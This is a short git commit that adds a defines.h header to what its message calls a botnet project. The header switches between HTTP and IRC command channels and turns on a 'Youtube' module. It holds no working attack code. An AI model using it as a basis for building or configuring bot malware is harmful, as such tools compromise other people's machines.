d1b3e05a8b488f2b6d2cb472d2efe8f12c4f6b0b
Kyle Heitman <kyle.heitman@uconn.edu>
2015-01-21 16:34:47 -0500

    Module editor
    Configure which modules for the botnet to use

---
+++ defines.h
@@ -0,0 +1,7 @@
+/*
+Use this header to define what modules to use comment out the modules you do not wish to use
+*/
+
+#define useHTTP  //either use HTTP or IRC not both
+//#define useIRC //IRC is outdated and lacks commands, already made skeleton but needs functionality work done
+#define useYoutube
